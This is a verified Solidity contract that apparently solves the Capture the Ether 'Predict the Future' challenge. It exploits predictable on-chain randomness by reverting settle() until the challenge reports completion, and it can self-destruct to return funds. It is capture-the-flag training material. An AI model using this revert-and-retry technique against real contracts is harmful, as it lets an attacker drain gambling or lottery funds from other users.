/**
 *Submitted for verification at Etherscan.io on 2022-01-11
*/

// Verified using https://dapp.tools

// hevm: flattened sources of src/PTFCSolution.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0 <0.9.0;

////// src/PTFCSolution.sol

/* pragma solidity ^0.8.0; */

interface Challenge {
    function settle() external;

    function lockInGuess(uint8 n) external;

    function isComplete() external returns (bool);
}

contract PTFCSolution {
    Challenge immutable challenge;
    address payable immutable owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor() {
        owner = payable(msg.sender);
        challenge = Challenge(0x8774219684BedFF4CE3f3204fAa1F683292Ba3e1);
    }

    function lockInGuess(uint8 n) public onlyOwner {
        challenge.lockInGuess(n);
    }

    function settle() public onlyOwner {
        challenge.settle();
        require(challenge.isComplete(), "Not completed");
    }

    function unsafeSettle() public onlyOwner {
        challenge.settle();
    }

    function destroy() public onlyOwner {
        selfdestruct(owner);
    }

    receive() external payable {}
}